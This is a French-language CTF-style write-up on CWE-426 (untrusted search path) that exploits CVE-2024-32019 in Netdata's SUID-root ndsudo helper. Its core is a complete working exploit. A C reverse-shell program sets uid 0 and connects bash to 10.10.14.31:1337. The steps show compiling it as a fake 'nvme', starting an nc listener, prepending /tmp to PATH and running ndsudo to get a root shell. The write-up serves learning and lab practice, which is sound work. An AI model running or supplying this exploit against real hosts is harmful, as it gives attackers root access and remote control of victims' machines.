# UNTRASTED SEARCH PATH

### <mark style="color:red;">🧩 Définition</mark>

* **Untrusted Search Path** (CWE-426) = lorsqu’un programme exécute une commande externe (ex: `nvme`, `ls`, `cat`) **sans utiliser un chemin absolu** (`/usr/bin/nvme`) mais uniquement le nom de commande.
* Le binaire recherche alors l’exécutable dans les répertoires listés dans `$PATH`.
* Si `$PATH` contient un répertoire contrôlé par l’attaquant (ex: `/tmp`), alors celui-ci peut injecter un exécutable malveillant qui sera exécuté **avec les privilèges du binaire vulnérable**.

***

### <mark style="color:red;">🛠 Cas CTF – Netdata</mark> <mark style="color:red;"></mark><mark style="color:red;">`ndsudo`</mark>

* **Binaire vulnérable** : `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`
*   **Propriétés** :

    ```bash
    -rwsr-xr-x 1 root root 123456 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
    ```

    → `SUID root` ⇒ tout ce qui est exécuté par ce binaire hérite des privilèges **root**.
* **Vulnérabilité** :
  * `ndsudo` appelle certaines commandes externes (`nvme`, `smartctl`, etc.) sans chemin absolu.
  * `$PATH` est respecté.
* **Exploitation** :
  1. Créer un exécutable malveillant nommé comme une commande attendue (`nvme`).
  2. Le placer dans un répertoire contrôlé (`/tmp`).
  3. Modifier `$PATH` pour que `/tmp` soit cherché en priorité.
  4. Lancer `ndsudo nvme-list` ⇒ exécution de notre binaire avec **root**.

***

### <mark style="color:red;">📂 Exemple PoC CTF</mark>

#### <mark style="color:green;">Code malveillant</mark> <mark style="color:green;"></mark><mark style="color:green;">`expkoit.c`</mark> <mark style="color:green;"></mark><mark style="color:green;">(reverse shell)</mark>

```c
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.31/1337 0>&1", NULL);
    return 0;
}
```

#### <mark style="color:green;">Compilation</mark>

```bash
x86_64-linux-gnu-gcc -o nvme expkoit.c -static
```

#### <mark style="color:green;">Déploiement</mark>

```bash
# Sur la machine attaquante
nc -lnvp 1337

# Sur la cible compromise
scp nvme victim:/tmp/nvme
chmod +x /tmp/nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

➡️ Shell root ouvert sur l’attaquant.

***

### <mark style="color:red;">🔎 Diagramme simplifié</mark>

```bash
[ User ]             [ Victim Host ]  
     │                     │
     │ compile exploit.c   │
     ├──────────────────▶  │  /tmp/nvme (malicious binary)
     │                     │
     │ export PATH=/tmp:$PATH
     │──────────────────▶  │
     │ run ndsudo nvme-list│
     ├──────────────────▶  │
     │                     │ -> ndsudo executes /tmp/nvme
     │                     │ -> privileges = root
     │◀────────────────────│
     │      root shell     │
```

***

### <mark style="color:red;">📚 Références Techniques</mark>

* **CVE** : [CVE-2024-32019](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)
* **CWE** : CWE-426 – _Untrusted Search Path_
* **Impact** : Escalade de privilèges locale (`root`)
* **Sévérité** : High – CVSS 8.8 (Confidentiality/Integrity/Availability = High)

***
